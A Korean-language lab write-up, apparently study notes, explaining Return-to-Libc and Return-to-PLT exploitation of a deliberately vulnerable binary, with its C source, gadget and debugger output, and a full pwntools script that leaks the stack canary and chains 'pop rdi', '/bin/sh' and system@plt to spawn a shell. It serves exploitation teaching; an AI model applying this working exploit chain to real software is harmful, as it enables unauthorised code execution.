#RTL #canary #PLT #ROP

### 0. 프롤로그

NX 보호기법으로 인해 버퍼에 주입한 셸 코드를 실행하기는 어려워졌지만,
공격자들은 실행권한이 남아있는 코드 영역으로 반환 주소(Return Address)를 덮는 공격 기법을 고안하게 됨.

프로세스에 실행 권한이 있는 메모리 영역은 일반적으로 바이너리 코드 영역과 바이너리가 참조하는 라이브러리의 코드 영역이다.

여기서 주목할 곳은 다양한 함수가 구현되어 있는 라이브러리이다. 라이브러리에는 유용한 함수들이 있는데, 예로 system이나 execve 함수들이다.

공격자들은 libc의 함수들로 NX를 우회하고 셸을 획득하는 공격 기법을 개발 하였고, 이를 Return To Libc라고 이름 지었다.
다른 라이브러리도 공격에 활용될 수 있으므로 이 공격 기법은 Return To Library 라고도 부른다.

### 1. 파일 정보

\# file ./rtl
./rtl: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a17643662cab9712713f3ff911dc0542865dc79a, not stripped

checksec --file=./rtl
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified   Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   69 Symbols        No    0  2./rtl

### 2. C  소스코드 분석
``` c
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

// 전역 const 포인터로, 문자열 "/bin/sh"를 가리킴
// 문자열 자체는 .rodata 섹션에 저장되고, 전역 심볼 binsh는 .data 섹션에 위치함.
// "/bin/sh"을 바이너리에 추가하기 위해 작성된 코드
// ASLR이 적용돼도 PIE가 적용되지 않으면 코드 세그먼트와 데이터 세그먼트의 주소를 고정되므로, "/bin/sh"의 주소는 고정되어 있다.
const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  // 입출력 버퍼링 제거
  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  // system 함수를 PLT에 추가하기
  // PLT와 GOT는 라이브러리 함수의 참조를 위해 사용되는 테이블이다.
  // 그 중 PLT에는 함수의 주소가 resolve되지 않았을 때, 함수의 주소를 구하고 실행하는 코드가 적혀있다.
  // ASLR이 걸려 있어도 PIE가 적용되어 있지 않으면 PLT의 주소는 고정됨.
  // 무작위의 주소로 매핑되는 라이브러리의 베이스 주소를 몰라도 이 방법으로 라이브러리 함수를 실행할 수 있다.
  // 이 공격 기법을 Return to PLT 라고 부름.
  /*
  1. system("echo 'system@plt'") 함수 호출 전
  - system 함수는 libc 안에 있음
  - 하지만 실행파일에는 libc함수의 주소가 고정돼 있지 않음 -> PLT/GOT 라는 중간 다리를 통해 불려야 함
  - 처음엔 GOT[system] 안에 아직 진짜 주소가 안 들어 있음
  2. system("echo ...") 실행 순간
  - system@plt 가 불림
  - dynamic linker가 libc에서 system 실제 주소를 찾아냄
  - GOT[system]에 libc의 system 함수 주소를 채워 넣음
  - 이후 "echo 'system@plt'" 실행됨 -> 화면에 출력
  - echo 명령은 인자로 받은 문자열을 화면에 출력하는 것이므로 그냥 "system@plt" 문자열 이 출력됨.
  3. 실행 후 상태
  - GOT[system]이 이제는 libc의 system을 정확히 가리킴
  - 따라서 그 뒤로는 system@plt 를 호출하면 바로 libc의 system이 실행됨.(더 이상 resolver 호출 안 함)
  */
  system("echo 'system@plt'");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}

```

ELF 의 PLT 에는 ELF 가 실행하는 라이브러리 함수만 포함하게 된다. 따라서 다음 코드를 작성하면 PLT에 system 함수를 추가할 수 있다.
``` c
  // Add system function to plt's entry
  system("echo 'system@plt'");
```


### 3. 익스프롤잇 설계

#### 1. 카나리 우회
첫 번째 입력에서 적절한 길이의 데이터를 입력하면 카나리를 구할 수 있다.

#### 2. rdi 값을 "/bin/sh"의 주소로 설정 및 셸 획득
카나리를 구했으면, 두 번째 입력으로 반환 주소를 덮을 수 있게 된다.

공격을 위해 알고 있는 정보
- "/bin/sh"의 주소
- system 함수의 PLT 주소를 안다 => system 함수를 호출 할 수 있다.

system("/bin/sh") 을 호출하면 셸을 획득할 수 있다.
x86-64의 호출 규약에 따르면 이는 rdi="/bin/sh" 주소인 상태에서 system 함수를 호출한 것과 같다.

"/bin/sh"의 주소를 rdi의 값으로 설정하는 법 => 리턴 가젯 이용

### 리턴 가젯 (ROPgadget 이용)

리턴 가젯(Return gadget)은 다음과 같이 ret 명령어로 끝나는 어셈블리 코드 조각을 의미한다.
ROPgadget 명령어를 사용하여 다음과 같이 가젯을 구할 수 있다.

```
$ ROPgadget --binary rtl
Gadgets information
============================================================
...
0x0000000000400596 : ret
...

Unique gadgets found: 83
$
```

리턴 가젯은 반환 주소를 덮는 공격의 유연성을 높여서 익스플로잇에 필요한 조건을 만족할 수 있도록 돕는다.
예를 들어, 이 예제에서는 rdi 값을 "/bin/sh"의 주소로 설정하고, system 함수를 호출해야 한다.
리턴 가젯을 사용하여 반환 주소와 이후의 버퍼를 다음과 같이 덮으면..........
pop rdi로 rdi에 "/bin/sh"의 주소를 설정하고, 이어지는 ret로 system 함수를 호출할 수 있다.

```
addr of ("pop rdi; ret")   <= return address
addr of string "/bin/sh"   <= ret + 0x8
addr of "system" plt       <= ret + 0x10
```

버퍼 오버 플오우 후 리턴 주소 자리에 우리가 적은 값들이 쌓이는 모습은 다음과 같다.
ret addr → "pop rdi ; ret" 가젯의 주소
ret+0x8   → "/bin/sh" 문자열 주소
ret+0x10  → system@plt 주소

#### 📌 실행 순서

1. 함수가 `ret` 할 때 → `rip = pop rdi ; ret` 로 점프
    - 이제 CPU는 `pop rdi ; ret` 가젯을 실행
        
2. `pop rdi ; ret` 실행 → 스택에서 다음 값(`/bin/sh` 주소)을 꺼내서 `rdi`에 넣음
    - 따라서 이 시점에서    
        `rdi = 주소("/bin/sh")`
        
3. 이어서 그 가젯의 `ret`이 실행됨 → 다음 스택 값(`system@plt`)으로 점프
    - 이때는 이미 `rdi = "/bin/sh"` 이므로, system 호출 인자가 준비된 상태    
4. `system@plt` 실행 → 결국 `system("/bin/sh")` 호출


### 4. 익스플로잇

#### 1) 카나리 우회

``` python
#!/usr/bin/env python3
# Name: rtl.py

from pwn import *

p = process('./rtl')
e = ELF('./rtl')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak canary
'''
buf address = [rbp-0x40]
canary address = [rbp-08]
canary의 첫바이트(0x00)까지 침범 : rbp-0x40 - rbp-0x08 = rpb-0x38 + 1 

printf("Buf: %s\n", buf)가 동작할 때:
- %s 는 널(0x00)을 만날 때까지 출력한다.
- 원래 카나리 첫 바이트가 0x00이라면 거기서 끊겨야 하는데, 우리가 그 바이트를 0x41로 바꿔놨으니 끊기지 않고 계속 출력됨.
그래서 출력스트림에는 A * 0x39 다으멩 카나리의 나머지 7바이트가 쭉 흘러나오게 됨.

p.recvuntil(buf)의 역할???
- 프로그램이 에코한 A * 0x39 전부를 깔끔히 소비해서 바로 다음 바이트부터 읽을 수 있게 동기화하는 용도임
- 그렇게 해야 그 다음 p.recvn(7)이 정확히 딱 맞게 카나리의 남은 7바이트를 읽어오게 됨.
- 마지막에 u64(b'\x00' + leaked7)로 첫 바이트(원래 0x00)를 앞에 붙여  정확한 8바이트 카나리를 복원함.
'''
buf = b'A' * 0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)
```

#### 2) 리턴 가젯 찾기(ROPgadget 이용)

설치법
```
$ python3 -m pip install ROPgadget --user
```

--re 옵션을 사용하면 정규표현식으로 가젯을 필터링할 수 있다.
일반적으로 바이너리에 포함된 가젯의 수가 매우 많으므로 필터링하여 가젯을 찾는 것을 추천.
```
$ ROPgadget --binary ./rtl --re "pop rdi"
Gadgets information
============================================================
0x0000000000400853 : pop rdi ; ret
```

#### 3) 익스플로잇

다음과 같이 가젯을 구성하고, 실행하면 system("/bin/sh")를 실행할 수 있다.
```
addr of ("pop rdi; ret")   <= return address
addr of string "/bin/sh"   <= ret + 0x8
addr of "system" plt       <= ret + 0x10
```

"/bin/sh"의 주소
```
pwndbg> search /bin/sh
rtl             0x400874 0x68732f6e69622f /* '/bin/sh' */
rtl             0x600874 0x68732f6e69622f /* '/bin/sh' */
libc-2.27.so    0x7ff36c1aa0fa 0x68732f6e69622f /* '/bin/sh' */
```

system 함수의 PLT 주소
```
pwndbg> plt
0x4005b0: puts@plt
0x4005c0: __stack_chk_fail@plt
0x4005d0: system@plt
0x4005e0: printf@plt
0x4005f0: read@plt
0x400600: setvbuf@plt
```

```
pwndbg> info func @plt
All functions matching regular expression "@plt":

Non-debugging symbols:
0x00000000004005b0  puts@plt
0x00000000004005c0  __stack_chk_fail@plt
0x00000000004005d0  system@plt
0x00000000004005e0  printf@plt
0x00000000004005f0  read@plt
0x0000000000400600  setvbuf@plt
```

##### 페이로드 작성시 주의사항

system 함수로 rip가 이동할 때, 스택은 반드시 0x10 단위로 정렬되어 있어야 한다.
이것은 system 함수 내부에 있는 movaps 명령어 때문인데, 이 명려어는 스택이 0x10 단위로 정렬되어 있지 않으면 Segmentation Fault를 발생한다.

system 함수를 이용한 익스플로잇을 작성할 때, 익스플로잇이 제대로 작성된 것 같은데도 Segmentation Fault가 발생한다면, system 함수의 가젯을 8바이트 뒤로 미뤄보는 것이 좋다.
이를 위해 아무 의미없는 가젯(no-op gadget)을 system 함수 전에 추가할 수 있다.
```
$ ROPgadget --binary=./rtl | grep ": ret"
0x0000000000400596 : ret
$
```


``` python
#!/usr/bin/env python3
# Name: rtl.py

from pwn import *

p = process('./rtl')
e = ELF('./rtl')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak canary
'''
buf address = [rbp-0x40]
canary address = [rbp-08]
canary의 첫바이트(0x00)까지 침범 : rbp-0x40 - rbp-0x08 = rpb-0x38 + 1 

printf("Buf: %s\n", buf)가 동작할 때:
- %s 는 널(0x00)을 만날 때까지 출력한다.
- 원래 카나리 첫 바이트가 0x00이라면 거기서 끊겨야 하는데, 우리가 그 바이트를 0x41로 바꿔놨으니 끊기지 않고 계속 출력됨.
그래서 출력스트림에는 A * 0x39 다으멩 카나리의 나머지 7바이트가 쭉 흘러나오게 됨.

p.recvuntil(buf)의 역할???
- 프로그램이 에코한 A * 0x39 전부를 깔끔히 소비해서 바로 다음 바이트부터 읽을 수 있게 동기화하는 용도임
- 그렇게 해야 그 다음 p.recvn(7)이 정확히 딱 맞게 카나리의 남은 7바이트를 읽어오게 됨.
- 마지막에 u64(b'\x00' + leaked7)로 첫 바이트(원래 0x00)를 앞에 붙여  정확한 8바이트 카나리를 복원함.
'''
buf = b'A' * 0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
'''
# ROPgadget --binary=./rtl | grep ": ret"
- x86-64 System V ABI 규약에 따르면,
  어떤 함수가 호출될 때 rsp(스택 포인터)가 16바이트로 정렬되어 있어야 한다.
- 왜냐하면 libc 함수 내부에서 SSE 명령어(movaps)를 쓸 수 있는데, 
  이 명령어는 메모리 주소가 16바이트 배수가 아니면 SIGSEGV (segmentation fault)가 발생한다.
- ret변수에 8바이트의 ret명령 주소값을 저장.
- 해서 8바이트를 보유하면서 자동으로 다음 가젯으로 넘어가게 됨.
- ret : pop rip, jump rip 이므로 다음 가젯 명령으로 넘어가는 것임.

payload += p64(ret)
- ret 실행 시 rsp += 8 되면서 스택 포인터가 바뀜
- 이로써 스택이 16바이트 정렬 상태로 맞춰짐함
- 그 다음 pop rdi ; ret, system@plt 같은 호출이 안정적으로 동작함
'''
system_plt = e.plt['system']
binsh = 0x400874
pop_rdi = 0x0000000000400853 
# ret = 0 # ROPgadget --binary=./rtl | grep ": ret"
ret = 0x0000000000400596

payload = b'A'*0x38 + p64(cnry) + b'B'*0x08
payload += p64(ret) # align stack to prevent errors caused by movaps
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)

pause()
p.sendafter(b'Buf: ', payload)

p.interactive()


```